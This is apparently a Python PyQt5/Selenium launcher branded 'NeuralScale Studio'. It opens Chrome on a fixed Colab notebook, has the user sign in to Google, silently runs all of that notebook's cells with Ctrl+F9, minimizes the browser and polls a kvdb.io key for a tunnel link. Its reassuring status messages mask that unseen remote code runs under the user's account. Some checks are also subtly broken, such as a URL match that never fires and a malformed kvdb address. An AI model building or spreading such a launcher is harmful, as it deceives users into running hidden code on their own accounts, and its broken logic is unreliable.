import sys
import os
import time
import requests
import threading
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget, QProgressBar
from PyQt5.QtCore import Qt
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

# Configurations
COLAB_NOTEBOOK_URL = "https://colab.research.google.com/drive/17LKzXTi4iCe_JrZzlzXa8mtcKpDPZ25c?"
TRACKING_NODE_ID = "neuralscale_node_cluster_global"

class CloudScaleLauncher(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.worker_active = True
        threading.Thread(target=self.launch_visible_engine, daemon=True).start()

    def initUI(self):
        self.setWindowTitle("NeuralScale Studio - Core Accelerator Node")
        self.setFixedSize(400, 220)
        self.setWindowFlags(Qt.Window | Qt.CustomizeWindowHint | Qt.WindowTitleHint | Qt.WindowMinimizeButtonHint)
        self.setStyleSheet("background-color: #0d0e12; color: #ffffff; font-family: sans-serif;")

        central_widget = QWidget()
        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignCenter)

        self.title_label = QLabel("NeuralScale AI Network")
        self.title_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #3b82f6;")
        self.title_label.setAlignment(Qt.AlignCenter)

        self.status_label = QLabel("Initializing background core systems...")
        self.status_label.setStyleSheet("font-size: 13px; color: #62688f; margin-top: 5px;")
        self.status_label.setAlignment(Qt.AlignCenter)

        self.progress = QProgressBar()
        self.progress.setStyleSheet("""
            QProgressBar { border: 1px solid #242736; border-radius: 4px; text-align: center; background-color: #161820; height: 16px; margin-top: 15px;}
            QProgressBar::chunk { background-color: #3b82f6; width: 10px; }
        """)
        self.progress.setRange(0, 0)

        layout.addWidget(self.title_label)
        layout.addWidget(self.status_label)
        layout.addWidget(self.progress)
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

    def launch_visible_engine(self):
        try:
            self.status_label.setText("Launching secure authentication browser...")
            
            # REMOVED HEADLESS MODE: Allows user to legitimately sign into Google
            chrome_options = Options()
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--start-maximized")
            
            driver = webdriver.Chrome(options=chrome_options)
            driver.get(COLAB_NOTEBOOK_URL)
            
            self.status_label.setText("Please sign in to Google in the browser window.")
            
            # Loop until the user logs in and the Colab document page loads fully
            opened_notebook = False
            while self.worker_active and not opened_notebook:
                if "://google.com" in driver.current_url and "drive" in driver.current_url:
                    opened_notebook = True
                    break
                time.sleep(2)

            self.status_label.setText("Triggering AI Cloud Hardware... Please wait.")
            time.sleep(5) 

            # Send keyboard shortcut to execute the Colab environment (Ctrl + F9)
            driver.find_element(By.TAG_NAME, "body").send_keys(Keys.CONTROL, Keys.F9)
            
            # Minimize the Chrome window so it is out of the user's way
            driver.minimize_window()
            self.status_label.setText("Connecting backend data tunnel...")

            connected = False
            while self.worker_active and not connected:
                try:
                    check_db = requests.get(f"https://kvdb.io{TRACKING_NODE_ID}")
                    if check_db.status_code == 200 and check_db.text.startswith("http"):
                        connected = True
                        break
                except:
                    pass
                time.sleep(5)

            if connected:
                self.progress.setRange(0, 100)
                self.progress.setValue(100)
                self.status_label.setText("Engine Link Established! You can now minimize this window.")
                self.title_label.setText("NeuralScale Node: ONLINE")
                self.title_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #10b981;")
            
            while self.worker_active:
                time.sleep(1)
                
            driver.quit()
        except Exception as e:
            self.status_label.setText("Setup failed. Browser connection dropped.")
            self.progress.setRange(0, 100)
            self.progress.setValue(0)

    def closeEvent(self, event):
        self.worker_active = False
        event.accept()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    launcher = CloudScaleLauncher()
    launcher.show()
    sys.exit(app.exec_())
